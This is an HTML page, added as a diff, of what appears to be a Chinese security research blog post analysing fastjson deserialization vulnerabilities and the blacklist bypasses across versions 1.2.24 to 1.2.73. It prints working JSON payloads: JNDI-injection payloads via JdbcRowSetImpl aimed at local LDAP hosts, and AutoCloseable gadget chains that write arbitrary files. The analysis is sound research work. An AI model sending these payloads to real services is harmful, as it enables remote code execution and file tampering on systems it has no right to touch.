@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>fastjson 反序列化漏洞整理 | Hexo</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/component.css" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <meta name="generator" content="Hexo">
+  <script src="http://static.duoshuo.com/embed.js"></script>
+  
+  
+  
+
+  
+
+</head>
+<body>
+<div class="container">
+    <div class="mp-pusher" id="mp-pusher">
+        <i id="scroll-up" class="fa fa-angle-up"></i>
+        <nav id="mp-menu" class="mp-menu">
+            <div class="mp-level">
+                <a data-pjax class="back-home" style="font-size: 20px" href="/"><h2 ><i class="fa fa-home"></i>
+                        Home</h2></a>
+                <ul class="first-level">
+                    <li>
+                        <a class="fa fa-archive" href="#"><i class="fa fa-angle-left">
+                            </i>&nbsp;&nbsp;Archive</a>
+                        <div class="mp-level page-list">
+                            <h2 ><i class="fa fa-archive"></i>
+                                Archive</h2>
+                            <a class="mp-back" href="#">back</a>
+                            <form id="search-form" action="">
+                                <input type="text" class="search search-archive" placeholder="Search.."/>
+                            </form>
+                            <ul>
+                                <div class="mp-scroll">
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2020/11/15/fastjson-反序列化漏洞整理/">fastjson 反序列化漏洞整理</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2020/11/15/Thymeleaf-模板漏洞分析/">Thymeleaf 模板漏洞分析</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2020/08/24/JDK多版本切换/">JDK多版本切换</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2020/08/24/shiro-权限绕过漏洞合集/">shiro 权限绕过漏洞合集</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE复现分析/">CVE-2020-5902 F5 BIG-IP RCE复现分析</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2020/08/06/Laravel-Cookie-Security漏洞分析/">Laravel Cookie Security漏洞分析</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2020/04/25/git-CVE-2020-5260分析/">git CVE-2020-5260分析</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2020/04/25/hello-world/">Hello World</a>
+                                </li>
+                                
+                                </div>
+                            </ul>
+                        </div>
+                    </li>
+                    <li>
+                        <a class="fa fa-copy" href="#"><i class="fa fa-angle-left">
+                            </i>&nbsp;&nbsp;Categories</a>
+
+                        <div class="mp-level page-list">
+                            <h2 ><i class="fa fa-copy"></i>
+                                Categories</h2>
+                            <a class="mp-back" href="#">back</a>
+                            <form id="search-form" action="">
+                                <input type="text" class="search search-category" placeholder="Search.."/>
+                            </form>
+                            <ul>
+                                <div class="mp-scroll">
+                                
+                                </div>
+                            </ul>
+                        </div>
+                    </li>
+                    <li>
+                        <a class="fa fa-tags" href="#"><i class="fa fa-angle-left">
+                            </i>&nbsp;&nbsp;Tags</a>
+                        <div class="mp-level page-list">
+                            <h2 ><i class="fa fa-tags"></i>
+                                Tags</h2>
+                            <a class="mp-back" href="#">back</a>
+                            <form id="search-form" action="">
+                                <input type="text" class="search search-tag" placeholder="Search.."/>
+                            </form>
+                            <ul>
+                                <div class="mp-scroll">
+                                
+                                </div>
+                            </ul>
+                        </div>
+                    </li>
+                    
+                    <li class="mp-pjax"><a class="fa fa-user" href="/about">&nbsp;&nbsp;&nbsp;About me</a></li>
+                    <li><a class="fa fa-github" href="#">&nbsp;&nbsp;&nbsp;Github</a></li>
+
+                </ul>
+
+            </div>
+        </nav>
+        <div id="pjax">
+            <div class="pjax-hidden" style="display: none">
+                
+                    <a  data-pjax href="/2020/11/15/fastjson-反序列化漏洞整理/">fastjson 反序列化漏洞整理</a>
+                
+                    <a  data-pjax href="/2020/11/15/Thymeleaf-模板漏洞分析/">Thymeleaf 模板漏洞分析</a>
+                
+                    <a  data-pjax href="/2020/08/24/JDK多版本切换/">JDK多版本切换</a>
+                
+                    <a  data-pjax href="/2020/08/24/shiro-权限绕过漏洞合集/">shiro 权限绕过漏洞合集</a>
+                
+                    <a  data-pjax href="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE复现分析/">CVE-2020-5902 F5 BIG-IP RCE复现分析</a>
+                
+                    <a  data-pjax href="/2020/08/06/Laravel-Cookie-Security漏洞分析/">Laravel Cookie Security漏洞分析</a>
+                
+                    <a  data-pjax href="/2020/04/25/git-CVE-2020-5260分析/">git CVE-2020-5260分析</a>
+                
+                    <a  data-pjax href="/2020/04/25/hello-world/">Hello World</a>
+                
+                
+                
+                <a data-pjax class="fa fa-user" href="/about">&nbsp;&nbsp;&nbsp;About me</a>
+            </div>
+            <nav class="nexus">
+                <li  style="border-left: 1px solid #c6d0da;">
+                    <a id="trigger" href="#"><i class="fa fa-bars"></i></a>
+                </li>
+                <li ><a id="nexus-back" data-pjax href="/">Hexo</a></li>
+                
+                <div id="nav-container">
+                    <div class="post-navbar" style="line-height: 63px;display:none">
+                        <li id="navbar-title"><a href="#">fastjson 反序列化漏洞整理</a></li>
+                        <li id="navbar-toc" style="border-left: none">
+                            <a style="padding-right: 15px">
+                                <span id="toc-content" >Introduction</span><i class="fa fa-chevron-down" ></i>
+                            </a>
+                            <div class="hidden-box">
+                                <ul id="toc"></ul>
+                            </div>
+                        </li>
+                    </div>
+                </div>
+                
+            </nav>
+
+            <div class="scroller">
+            <div class="scroller-inner">
+
+
+<!-- -->
+<!--<body class="post-template">-->
+<!---->
+  
+
+<main class="content" role="main">
+    <article class="post" >
+    <span class="post-meta">
+                  <div class="tag-tile">
+                      
+                  </div>
+                <h1 class="post-title" style="margin: 14px 0;color:#50585D">fastjson 反序列化漏洞整理</h1>
+
+                    <div class="post-meta">
+                        Post on<span class="fa fa-clock-o"></span>
+                        <time datetime="2020-11-15T12:25:17.000Z"
+                              itemprop="datePublished">2020-11-15</time>
+                    </div>
+    </span>
+
+        <section class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>fastjson养活了一大批安全从业人员，学习java安全也不得不对fastjson进行学习。在此整理了fastjson的历史漏洞中主要的几个反序列化漏洞，记录下开发者与安全研究者攻防对抗的过程。<br>文中用到的demo及PoC <a href="https://github.com/hex0wn/learn-java-bug/tree/master/fastbug" target="_blank" rel="noopener">下载地址</a></p>
+<h2 id="版本-lt-1-2-24"><a href="#版本-lt-1-2-24" class="headerlink" title="版本&lt;=1.2.24"></a>版本&lt;=1.2.24</h2><p>这应该是fastjson爆出的第一个反序列化漏洞，基本上没什么限制，可以直接通过jdbc构造jndi注入。<br><code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost/Test&quot;,&quot;autoCommit&quot;:true}</code><br>运行PoC调试分析其反序列化流程，报错的调用栈信息如下：</p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/24-1.png" class="">  
+<p>其中几个重要的类，fastjson主要通过JSON类将序列化和反序列化方法暴露给用户。在DefaultJSONParser类中进行json解析并对各种类型进行还原，它依赖JSONScanner来做词法解析，通过FastjsonASMDeserializer（在JavaBeanDeserializer类的基础上增加asm功能）来反序列化对象。补充：后续分析过程中发现不止JavaBeanDeserializer这一个反序列化操作类，会根据类的类型选择对应的操作类，以JavaBeanDeserializer兜底。</p>
+<p>当解析到字段的key等于@type，会将该项的值最为类名来加载类</p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/24-2.png" class="">  
+<p>然后调用JavaBeanDeserializer.deserialze反序列化指定的类。反序列化过程中会调用符合条件的getter和setter方法来还原对象中的属性。<br>setter方法的限制：</p>
+<blockquote>
+<p>方法名称长度&gt;=4<br>非静态方法<br>返回类型为void或者当前类<br>函数只有1个参数  </p>
+</blockquote>
+<p>getter方法的限制：</p>
+<blockquote>
+<p>方法名长度&gt;=4<br>非静态方法<br>以get开头且第4个字母为大写<br>无传入参数<br>返回值类型继承自Collection、Map、AtomicBoolean、AtomicInteger、AtomicLong  </p>
+</blockquote>
+<p>通过调用<code>JdbcRowSetImpl.setdataSourceName</code>和<code>setAutoCommit</code>触发jndi注入从而rce。调用链具体分析省略<br>补充：原本以为JavaBeanDeserializer.deserialze过程中只会调用getter、setter方法，但在分析1.2.68的利用条件时存在疑问。对JavaBeanDeserializer.deserialze方法和JavaBeanInfo类进行了分析，创建JavaBeanDeserializer时会先生成目标类型的JavaBeanInfo对象，其中包含构造函数、方法、字段等信息。getter、setter等方法会转化为字段存储在JavaBeanInfo.fields。deserialze方法的逻辑简单归纳如下：</p>
+<ol>
+<li>存在无参构造函数则会调用无参构造函数，并且调用getter、setter等方法</li>
+<li>不存在无参构造函数，但存在JSONCreator注解（只能有1个），调用该注解标识的构造函数，并且调用getter、setter方法</li>
+<li>不存在无参构造函数，不存在JSONCreator注解，存在有参构造函数（需要jdk带符号信息）。则遍历构造函数取参数最多的一个（一样多则按顺序取第一个），并且将构造函数的参数作为字段，解析完所有字段后调用该构造函数创建实例</li>
+<li>不存在上述构造函数，则只调用getter、setter方法<br>构造函数需要是public</li>
+</ol>
+<h2 id="版本1-2-25-1-2-41"><a href="#版本1-2-25-1-2-41" class="headerlink" title="版本1.2.25-1.2.41"></a>版本1.2.25-1.2.41</h2><p>对比1.2.24和1.2.25的代码，原先通过TypeUtils.loadClass来加载类，修改后通过<code>config.checkAutoType</code>来加载类。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/25-1.png" class="">  
+<p>具体看一下checkAutoType的限制：<br>开启autotype或者设置了expectClass的情况，先进行白名单查找，匹配到则调用TypeUtils.loadClass加载类；然后如果匹配到黑名单则抛出异常。默认情况下autotype=false，expectClass=null，不会进入此流程。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/25-2.png" class="">  
+<p>autotype关闭的情况下，类似上面的情况。但先匹配黑名单，再匹配白名单。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/25-3.png" class="">  
+<p>上面两种情况没找到，也就是黑白名单都没匹配到。则再判断开启autotype或者设置了expectClass（同第一处判断条件），调用TypeUtils.loadClass加载类。最后判断类型是否符合期望  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/25-4.png" class="">  
+<p>白名单默认为空，黑名单如下：  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/25-5.png" class="">  
+
+<p>默认情况下autotype关闭，只加载白名单中的类。此阶段的对抗主要在于开发者手动开启了autotype，对黑名单的绕过和加固。<br>TypeUtils.loadClass中如果类名以<code>L</code>开始、以<code>;</code>结束，则会截取字符串重新加载。由于黑名单校验在此之前，并且使用startWith进行匹配。所以通过<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>可以绕过黑名单校验。</p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/25-6.png" class="">  
+
+<h2 id="版本1-2-42"><a href="#版本1-2-42" class="headerlink" title="版本1.2.42"></a>版本1.2.42</h2><p>为了修复<code>L;</code>绕过的问题，在checkAutoType函数中会去掉开头L和结尾; 。并且将黑白名单从明文改成了hash校验，但依然是从前往后一个个字符进行校验。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/42.png" class="">  
+<p>这里的绕过方式也非常简单，通过LLcom.sun.rowset.JdbcRowSetImpl;;绕过</p>
+<h2 id="版本1-2-43"><a href="#版本1-2-43" class="headerlink" title="版本1.2.43"></a>版本1.2.43</h2><p>针对上面的情况，在版本1.2.43增加了判断条件，检测到LL则抛出异常。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/43.png" class="">  
+<p>然而TypeUtils.loadClass中对以[开始的类名也做了处理，可以继续构造数组形式的类型，在parseArray函数中触发反序列化。<br><code>&quot;{\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[{\&quot;dataSourceName\&quot;:\&quot;ldap://localhost/test\&quot;,\&quot;autoCommit\&quot;:true}&quot;</code></p>
+<p>在1.2.44版本中检测到[开始或者L开始;结尾两种情况都会直接抛出异常，至此无法再使用此方式绕过黑名单校验。</p>
+<h2 id="版本1-2-47"><a href="#版本1-2-47" class="headerlink" title="版本1.2.47"></a>版本1.2.47</h2><p>再看下checkAutoType函数，对部分代码进行了隐藏，重点的流程如下</p>
+<ol>
+<li>autoTypeSupport || expectClass != null，先匹配白名单再匹配黑名单</li>
+<li>TypeUtils.getClassFromMapping 从mappings查找类</li>
+<li>deserializers.findClass 从buckets查找类</li>
+<li>autoTypeSupport关闭，先匹配黑名单再匹配白名单</li>
+<li>TypeUtils.loadClass，从mapping查找类，查不到则会对[、L;进行处理，然后从classLoader.loadClass、contextClassLoader.loadClass、Class.forName来加载类</li>
+</ol>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/47-1.png" class="">  
+<p>默认白名单为空，所以不管开不开autotype，只能加载mappings和buckets中包含的类。使用PoC进行调试 <code>{&quot;a&quot;: {&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;}, &quot;b&quot;: {&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;: &quot;ldap://127.0.0.1/Exploit&quot;, &quot;autoCommit&quot;: true}}</code><br>deserializers.findClass时从bucket找到了java.lang.Class，然后调用deserializer.deserialze来反序列化类。此时的serializer为MiscCodec，其中对多种常见类型进行反序列化。当需要反序列化Class时，调用TypeUtils.loadClass来加载类。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/47-2.png" class="">  
+
+<p>调用一参数和两参数的loadClass方法时，会设置cache=true。cache为true时，成功加载类之后会将其（<code>com.sun.rowset.JdbcRowSetImpl</code>）放入mappings中  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/47-3.png" class="">  
+
+<p>所以再次调用checkAutoType时，由于<code>com.sun.rowset.JdbcRowSetImpl</code>在mappings中，能够通过TypeUtils.getClassFromMapping查到到类并返回，绕过了对黑名单的检查。<br>除了java.lang.Class之外，mappings和buckets中可能还有其他类能够进行一些利用。</p>
+<h2 id="版本1-2-48-1-2-68"><a href="#版本1-2-48-1-2-68" class="headerlink" title="版本1.2.48-1.2.68"></a>版本1.2.48-1.2.68</h2><p>对比1.2.47与48的代码，主要做了这些修改。TypeUtils.loadClass两参数的方法中将cache默认设为false，并且对loadClass三参数方法中对所有的mappings.put加上了cache的判断。并且修改了各处对TypeUtils.loadClass的调用中cache参数，MiscCodec类中cache改为false，checkAutoType方法中加载白名单类时cache为true。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/48-1.png" class="">  
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/48-2.png" class="">  
+<p>对exceptClass也进行了调整  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/48-3.png" class="">  
+
+<p>原先的版本中不管开不开autotype，前面没加载到类的情况下，最后都会调用TypeUtils.loadClass来加载类。但是修改后，增加了一个额外的条件(autoTypeSupport || jsonType || expectClassFlag)，三项至少有一项为true才允许加载。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/48-4.png" class="">  
+
+<p>所以不开autotype的情况下只能通过mappings和buckets中内置的类进行利用。网上流传的两个利用类：AutoCloseable和Throwable（实际是用的<code>java.lang.Exception</code>走ThrowableDeserializer，<code>java.lang.Throwalbe</code>并不在内置名单中）。前者通过JavaBeanDeserializer来还原类，后者通过ThrowableDeserializer来还原类。但两者原理类似，都是通过指定了exceptClass来加载指定类型的派生类。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/48-5.png" class="">  
+
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/48-6.png" class="">  
+<p>由于有exceptClass的限制，想要找到rce的利用链变得比较复杂了，网上公开的利用链多是文件读写类型。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.lang.AutoCloseable"</span>,</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"sun.rmi.server.MarshalOutputStream"</span>,</span><br><span class="line">    <span class="attr">"out"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.util.zip.InflaterOutputStream"</span>,</span><br><span class="line">        <span class="attr">"out"</span>: &#123;</span><br><span class="line">           <span class="attr">"@type"</span>: <span class="string">"java.io.FileOutputStream"</span>,</span><br><span class="line">           <span class="attr">"file"</span>: <span class="string">"/tmp/asdasd"</span>,</span><br><span class="line">           <span class="attr">"append"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"infl"</span>: &#123;</span><br><span class="line">           <span class="attr">"input"</span>: &#123;</span><br><span class="line">               <span class="attr">"array"</span>: <span class="string">"eJxLLE5JTCkGAAh5AnE="</span>,</span><br><span class="line">               <span class="attr">"limit"</span>: <span class="number">14</span></span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"bufLen"</span>: <span class="string">"100"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"protocolVersion"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>jdk11可以复现，jdk8报错  <code>default constructor not found. class sun.rmi.server.MarshalOutputStream</code><br>jdk8获取不到构造函数的参数，根据@rmb122  的说法应该是windows中的jdk8没带符号信息导致的。具体细节后续再分析  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/48-7.png" class="">  
+
+
+<h2 id="版本1-2-69-1-2-73"><a href="#版本1-2-69-1-2-73" class="headerlink" title="版本1.2.69-1.2.73"></a>版本1.2.69-1.2.73</h2><p>相比于1.2.68的代码，ParserConfig类中主要的改动是对黑名单进行了加固，再checkAutoType方法中exceptClass增加了对<code>java.lang.AutoCloseable</code>、<code>java.lang.Readable</code>、<code>java.lang.Runnable</code>的拦截。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/69.png" class="">  
+
+<p>不开safeMode的情况下，依然有可能通过mappings中内置的类来绕过autoType。而buckets中存储的类指定了反序列化操作类，这些类不太可能被利用。</p>
+<p>比如在mappings中的java.lang.Exception没有被拦截，但较难找到利用链</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>JSONPath功能  <a href="https://github.com/alibaba/fastjson/wiki/JSONPath" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/wiki/JSONPath</a><br>调用parser.parse()解析json字符串时，其中遇到$ref类型的key时，会将其添加到ResolveTask。字符串解析完成后调用handleResovleTask进行处理  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/o1.png" class="">  
+<p>调用jsonpath.isRef时会把ref解析按JSONPath语法解析成多个Segment，每种Segment的功能不一样。暂时只简单介绍PropertySegment，它会通过属性或者调用getter方法来获取数据。  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/o2.png" class="">  
+<p>jsonpath.eval会遍历所有Segment依次执行，并且上一个Segment执行的结果会作为参数传递到下一个Segment。也就是链式调用，可以通过’$ref’:’$a.bbb.ccc.ddd’调用a.getBbb().getCcc().getDdd()方法  </p>
+<img src="/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/o3.png" class="">  
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/7027" target="_blank" rel="noopener">https://xz.aliyun.com/t/7027</a><br><a href="https://mp.weixin.qq.com/s/wdOb5ESfbkMSfdDlRvOg-g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wdOb5ESfbkMSfdDlRvOg-g</a><br><a href="https://b1ue.cn/archives/382.html" target="_blank" rel="noopener">https://b1ue.cn/archives/382.html</a><br><a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/</a></p>
+<h3 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h3><p>浅蓝发的1.2.68利用第三方gadget写文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;f:&#x2F;test&#x2F;pwn.txt&quot;,</span><br><span class="line">        &quot;tempPath&quot;: &quot;f:&#x2F;test&#x2F;test.txt&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;YjF1M3I&#x3D;&quot;,</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+        </section>
+        <hr/>
+        <nav class="pagination" style="width:auto" role="pagination">
+            
+            <a style="cursor:default" class="newer-posts" href="#">This is the First Post</a>
+            
+            <a class="share-button" data-original-title title>Share this Post</a>
+            
+            <a data-pjax class="older-posts" href="/2020/11/15/Thymeleaf-模板漏洞分析/">Next Post →</a>
+            
+        </nav>
+        <br/>
+        <br/>
+        <section id="comment">
+            <div id="comment-box"></div>
+        </section>
+
+
+    </article>
+</main>
+
+
+  
+<footer class="site-footer">
+    
+    <div class="inner">
+        <section class="copyright"><a href="/"></a> &copy; Hexo 2014</section>
+        <section class="poweredby">Published with <a target="_blank" href="http://hexo.io/">Hexo   </a> and Theme by <a target="_blank" href="https://github.com/yuche/hexo-theme-kael">Kael</a></section>
+    </div>
+</footer>
+</div>
+</div><!-- /scroller -->
+
+</div><!-- /pusher -->
+</div><!-- /container -->
+</div>
+
+<!-- Easter eggs -->
+
+<div class="egg animated">
+    <a id="close-button" href="#">X</a>
+    <div class="block">
+        <div class="loading">
+            <span class="ball1"></span>
+            <span class="ball2"></span>
+        </div>
+    </div>
+</div>
+  
+<script src="//cdn.staticfile.org/jquery/1.11.0/jquery.min.js"></script>
+<script>
+    if (!window.jQuery) {
+        var script = document.createElement('script');
+        script.src = "/js/jquery.min.js";
+        document.body.appendChild(script);
+    }
+</script>
+<script type="text/javascript" src="/js/lib.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
+
+
+
+
+
+
+
+</body>
+</html>
